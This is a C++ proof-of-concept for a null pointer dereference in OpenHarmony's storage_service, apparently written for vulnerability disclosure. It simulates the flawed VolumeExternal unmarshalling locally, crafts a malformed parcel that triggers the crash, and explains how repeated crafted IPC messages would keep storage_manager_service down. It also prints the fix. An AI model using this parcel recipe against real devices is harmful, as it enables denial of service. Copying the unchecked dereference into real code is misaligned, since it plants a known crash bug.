/*
 * PoC: VolumeExternal::Unmarshalling() NULL Pointer Dereference
 * Target: OpenHarmony storage_service volume_external.cpp:139
 * Bug: VolumeCore::Unmarshalling() can return nullptr on malformed Parcel,
 *      but VolumeExternal::Unmarshalling dereferences it unconditionally.
 * Impact: DoS (crash storage_manager_service) via crafted IPC message
 *
 * Build: g++ -o poc poc.cpp -std=c++17 -O2
 */

#include <cstdint>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <signal.h>
#include <setjmp.h>
#include <new>

static jmp_buf jump_buffer;
static volatile int caught_signal = 0;

static void signal_handler(int sig) {
    caught_signal = sig;
    longjmp(jump_buffer, 1);
}

/*
 * Simulated Parcel - minimal reproduction of OpenHarmony's MessageParcel
 * VolumeCore::Unmarshalling reads: String(id), Int32(type), String(diskId),
 *   Int32(state), Bool(errorFlag), String(fsType), String(extraInfo), Uint32(partitionNum)
 * If any read fails, it returns nullptr.
 */
class Parcel {
public:
    uint8_t *data_;
    size_t size_;
    size_t pos_;

    Parcel(uint8_t *data, size_t size) : data_(data), size_(size), pos_(0) {}

    bool ReadString(char *out, size_t maxLen) {
        if (pos_ + 4 > size_) return false;
        uint32_t len;
        memcpy(&len, data_ + pos_, 4);
        pos_ += 4;
        if (len == 0xFFFFFFFF) return false; // null string marker = parse failure
        if (pos_ + len > size_) return false;
        size_t copyLen = len < maxLen - 1 ? len : maxLen - 1;
        memcpy(out, data_ + pos_, copyLen);
        out[copyLen] = '\0';
        pos_ += len;
        return true;
    }

    bool ReadInt32(int32_t *out) {
        if (pos_ + 4 > size_) return false;
        memcpy(out, data_ + pos_, 4);
        pos_ += 4;
        return true;
    }

    bool ReadUint32(uint32_t *out) {
        if (pos_ + 4 > size_) return false;
        memcpy(out, data_ + pos_, 4);
        pos_ += 4;
        return true;
    }

    bool ReadBool(bool *out) {
        if (pos_ + 1 > size_) return false;
        *out = data_[pos_] != 0;
        pos_ += 1;
        return true;
    }
};

struct VolumeCore {
    char id_[64];
    int32_t type_;
    char diskId_[64];
    int32_t state_;
    bool errorFlag_;
    char fsType_[32];
    char extraInfo_[128];
    uint32_t partitionNum_;
};

/*
 * Simulates VolumeCore::Unmarshalling - returns nullptr on parse failure
 */
VolumeCore* VolumeCore_Unmarshalling(Parcel &parcel) {
    VolumeCore *core = new (std::nothrow) VolumeCore();
    if (!core) return nullptr;

    if (!parcel.ReadString(core->id_, sizeof(core->id_))) goto fail;
    if (!parcel.ReadInt32(&core->type_)) goto fail;
    if (!parcel.ReadString(core->diskId_, sizeof(core->diskId_))) goto fail;
    if (!parcel.ReadInt32(&core->state_)) goto fail;
    if (!parcel.ReadBool(&core->errorFlag_)) goto fail;
    if (!parcel.ReadString(core->fsType_, sizeof(core->fsType_))) goto fail;
    if (!parcel.ReadString(core->extraInfo_, sizeof(core->extraInfo_))) goto fail;
    if (!parcel.ReadUint32(&core->partitionNum_)) goto fail;

    return core;

fail:
    delete core;
    return nullptr;
}

struct VolumeExternal {
    VolumeCore core_;
    int32_t flags_;
    int32_t fsType_;
    char fsUuid_[64];
    char path_[256];
    char description_[128];
};

/*
 * Reproduces the vulnerable VolumeExternal::Unmarshalling
 * Original code:
 *   std::unique_ptr<VolumeCore> volumeCorePtr(VolumeCore::Unmarshalling(parcel));
 *   VolumeExternal* obj = new (std::nothrow) VolumeExternal(*volumeCorePtr);
 *                                                           ^^^^^^^^^^^^^^
 *                                           Dereferences nullptr if Unmarshalling failed!
 */
VolumeExternal* VolumeExternal_Unmarshalling(Parcel &parcel) {
    VolumeCore *volumeCorePtr = VolumeCore_Unmarshalling(parcel);
    // BUG: No nullptr check before dereference
    VolumeExternal *obj = new (std::nothrow) VolumeExternal();
    if (!obj) {
        delete volumeCorePtr;
        return nullptr;
    }
    // This line crashes if volumeCorePtr is nullptr
    obj->core_ = *volumeCorePtr;  // ← NULL POINTER DEREFERENCE

    delete volumeCorePtr;
    obj->flags_ = 0;
    parcel.ReadInt32(&obj->flags_);
    return obj;
}

int main() {
    printf("=== VolumeExternal::Unmarshalling() NULL Pointer Dereference PoC ===\n");
    printf("Target: OpenHarmony storage_service volume_external.cpp:139\n");
    printf("Bug: VolumeCore::Unmarshalling returns nullptr on malformed Parcel,\n");
    printf("     VolumeExternal::Unmarshalling dereferences it without check\n");
    printf("Impact: storage_manager_service crash (DoS)\n\n");

    /*
     * Craft a malformed Parcel that causes VolumeCore::Unmarshalling to fail.
     * We write a valid string length for id_, then put an invalid marker (0xFFFFFFFF)
     * for the next string field, causing the parse to fail and return nullptr.
     */
    uint8_t malicious_parcel[64];
    size_t offset = 0;

    // id_ string: length=3, data="vol"
    uint32_t len = 3;
    memcpy(malicious_parcel + offset, &len, 4); offset += 4;
    memcpy(malicious_parcel + offset, "vol", 3); offset += 3;

    // type_ int32: 1
    int32_t type = 1;
    memcpy(malicious_parcel + offset, &type, 4); offset += 4;

    // diskId_ string: INVALID (0xFFFFFFFF = null marker → parse failure)
    uint32_t null_marker = 0xFFFFFFFF;
    memcpy(malicious_parcel + offset, &null_marker, 4); offset += 4;

    Parcel parcel(malicious_parcel, offset);

    printf("[*] Crafted malformed Parcel (%zu bytes):\n", offset);
    printf("[*]   id_ = \"vol\" (valid)\n");
    printf("[*]   type_ = 1 (valid)\n");
    printf("[*]   diskId_ = 0xFFFFFFFF (INVALID → causes Unmarshalling to return nullptr)\n\n");

    // Set up signal handler to catch SIGSEGV
    struct sigaction sa;
    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    printf("[*] Calling VolumeExternal::Unmarshalling with malformed Parcel...\n");

    if (setjmp(jump_buffer) == 0) {
        VolumeExternal *result = VolumeExternal_Unmarshalling(parcel);
        if (result) {
            printf("[-] Unexpected: Unmarshalling succeeded\n");
            delete result;
        } else {
            printf("[-] Returned nullptr without crash (patched behavior)\n");
        }
    } else {
        printf("\n[!] CRASH: Caught signal %d (%s)\n", caught_signal,
               caught_signal == SIGSEGV ? "SIGSEGV" : "SIGBUS");
        printf("[!] NULL pointer dereference triggered!\n\n");
        printf("[+] PoC SUCCESS: VolumeExternal::Unmarshalling crashes on malformed Parcel\n");
        printf("[+] Real-world impact:\n");
        printf("[+]   1. Attacker sends crafted IPC message to storage_manager_service\n");
        printf("[+]   2. Service calls VolumeExternal::Unmarshalling on the Parcel\n");
        printf("[+]   3. VolumeCore::Unmarshalling fails and returns nullptr\n");
        printf("[+]   4. Nullptr is dereferenced → service crashes\n");
        printf("[+]   5. Repeated crashes = persistent DoS of storage management\n\n");
        printf("[+] Fix: Check volumeCorePtr for nullptr before dereference:\n");
        printf("[+]   if (!volumeCorePtr) { return nullptr; }\n");
        return 0;
    }

    return 1;
}
